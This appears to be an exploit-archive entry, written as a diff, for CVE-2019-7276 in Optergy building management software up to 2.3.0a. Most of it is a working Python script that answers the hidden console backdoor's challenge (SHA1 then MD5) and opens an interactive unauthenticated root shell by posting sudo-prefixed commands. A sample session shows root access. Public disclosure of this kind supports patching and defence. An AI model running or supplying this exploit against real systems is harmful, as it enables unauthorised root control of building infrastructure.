@@ -1,0 +1,83 @@
+# Title: Optergy 2.3.0a - Remote Code Execution
+# Author: LiquidWorm
+# Date: 2019-11-05
+# Vendor: https://optergy.com/
+# Product web page: https://optergy.com/products/
+# Affected version: <=2.3.0a
+# Advisory: https://applied-risk.com/resources/ar-2019-008
+# Paper: https://applied-risk.com/resources/i-own-your-building-management-system
+# CVE: CVE-2019-7276
+
+# PoC:
+
+#!/usr/bin/env python
+#
+# Unauthenticated Remote Root Exploit in Optergy BMS (Console Backdoor)
+#
+# Affected version <=2.0.3a (Proton and Enterprise)
+#
+##############################################################################
+#
+# lqwrm@metalgear:~/stuff/optergy$ python getroot.py 192.168.232.19
+# Challenge received: 1547540929287
+# SHA1: 56a6e5bf103591ed45faa2159cae234d04f06d93
+# MD5 from SHA1: 873efc9ca9171d575623a99aeda44e31
+# Answer: 56a6e5bf103591ed45faa2159cae234d04f06d93873efc9ca9171d575623a99aeda44e31
+# # id
+# uid=0(root) gid=0(root) groups=0(root)
+#
+##############################################################################
+#
+#
+
+import os#######
+import sys######
+import json#####
+import hashlib##
+import requests#
+
+piton = os.path.basename(sys.argv[0])
+
+if len(sys.argv) < 2:
+    print '\n\x20\x20[*] Usage: '+piton+' <ip:port>\n'
+    sys.exit()
+
+while True:
+
+    challenge_url = 'http://'+sys.argv[1]+'/tools/ajax/ConsoleResult.html?get'
+
+    try:
+        req1 = requests.get(challenge_url)
+        get_challenge = json.loads(req1.text)
+        challenge = get_challenge['response']['message']
+        print 'Challenge received: ' + challenge
+
+        hash_object = hashlib.sha1(challenge.encode())
+        print 'SHA1: '+(hash_object.hexdigest())
+        h1 = (hash_object.hexdigest())
+        hash_object = hashlib.md5(h1.encode())
+        print 'MD5 from SHA1: '+(hash_object.hexdigest())
+        h2 = (hash_object.hexdigest())
+        print 'Answer: '+h1+h2
+        
+        zeTargets = 'http://'+sys.argv[1]+'/tools/ajax/ConsoleResult.html'
+        zeCommand = raw_input('# ')
+        if zeCommand.strip() == 'exit':
+            sys.exit()
+        zeHeaders = {'User-Agent'      : 'BB/BMS-251.4ev4h',
+                     'Accept'          : '*/*',
+                     'Accept-Encoding' : 'gzip, deflate',
+                     'Accept-Language' : 'mk-MK,mk;q=1.7',
+                     'Connection'      : 'keep-alive',
+                     'Connection-Type' : 'application/x-www-form-urlencoded'}
+        zePardata = {'command'         : 'sudo '+zeCommand,
+                     'challenge'       : challenge,
+                     'answer'          : h1+h2}
+
+        zeRequest = requests.post(zeTargets, headers=zeHeaders, data=zePardata)
+        get_resp = json.loads(zeRequest.text)
+        get_answ = get_resp['response']['message']
+        print get_answ
+    except Exception:
+        print '[*] Error!'
+        break
